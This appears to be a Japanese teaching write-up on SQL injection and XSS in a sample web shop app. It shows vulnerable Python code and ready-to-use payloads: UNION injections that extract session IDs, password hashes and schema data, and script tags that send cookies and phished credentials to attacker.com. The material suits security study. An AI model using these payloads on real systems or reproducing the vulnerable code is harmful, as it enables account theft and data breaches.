# SQLインジェクション攻撃

## 脆弱なコード
```python
def get_all_products(search_query=None):
    """すべての商品情報を取得する。検索クエリが指定された場合は検索結果を返す。"""
    conn = get_db_connection()
    cursor = conn.cursor(dictionary=True)
    
    if search_query:
        # SQLインジェクションが可能な脆弱な実装
        cursor.execute(f"SELECT * FROM products WHERE name LIKE '%{search_query}%' OR description LIKE '%{search_query}%' ORDER BY id")
    else:
        cursor.execute("SELECT * FROM products ORDER BY id")
    
    products = cursor.fetchall()
    conn.close()
    return products
```

## 脆弱性の詳細
**問題点**: f-stringを使用してユーザー入力を直接SQLクエリに埋め込んでいる

### 攻撃例1: セッション情報の窃取
```
検索クエリ: -1' UNION SELECT user_id as id, session_id as name, expires_at as description, 1 as price, NULL as seller, NULL as image_url FROM sessions -- 
```

実際に実行されるSQL:
```sql
SELECT * FROM products WHERE name LIKE '%-1' UNION SELECT user_id as id, session_id as name, expires_at as description, 1 as price, NULL as seller, NULL as image_url FROM sessions -- %' OR description LIKE '%-1' UNION SELECT user_id as id, session_id as name, expires_at as description, 1 as price, NULL as seller, NULL as image_url FROM sessions -- %' ORDER BY id
```

### 攻撃例2: 全ユーザー情報の取得
```
検索クエリ: -1' UNION SELECT id, username as name, password_hash as description, 0 as price, NULL as seller, NULL as image_url FROM users -- 
```

### 攻撃例3: データベース構造の調査
```
検索クエリ: -1' UNION SELECT table_name as id, column_name as name, data_type as description, 0 as price, NULL as seller, NULL as image_url FROM information_schema.columns -- 
```


# XSS（Cross-Site Scripting）攻撃

## 脆弱なコード（データベース側）
```python
def create_message(sender_username, recipient_username, content):
    """新規メッセージを作成する。"""
    # 送信者と受信者のユーザー名からユーザーIDを取得
    sender = get_user_by_username(sender_username)
    recipient = get_user_by_username(recipient_username)
    
    if not sender:
        raise ValueError(f"Sender '{sender_username}' not found")
    if not recipient:
        raise ValueError(f"Recipient '{recipient_username}' not found")
    
    sender_id = sender['id']
    recipient_id = recipient['id']
    
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute(
        "INSERT INTO messages (sender_id, recipient_id, content) VALUES (%s, %s, %s)",
        (sender_id, recipient_id, content)
    )
    conn.commit()
    conn.close()
```

## 脆弱性の詳細
**問題点**: メッセージの内容（content）に対してサニタイゼーション（無害化処理）を行っていない

### 攻撃例1: アラート表示
```html
メッセージ内容: <script>alert('XSS攻撃成功！');</script>
```

### 攻撃例2: Cookieの窃取
```html
メッセージ内容: <script>document.location='http://attacker.com/steal.php?cookie='+document.cookie;</script>
```

### 攻撃例3: フォームの改ざん
```html
メッセージ内容: <script>
document.body.innerHTML = '<h1>偽のログインフォーム</h1><form action="http://attacker.com/steal.php"><input type="text" name="username" placeholder="ユーザー名"><input type="password" name="password" placeholder="パスワード"><input type="submit" value="ログイン"></form>';
</script>
```
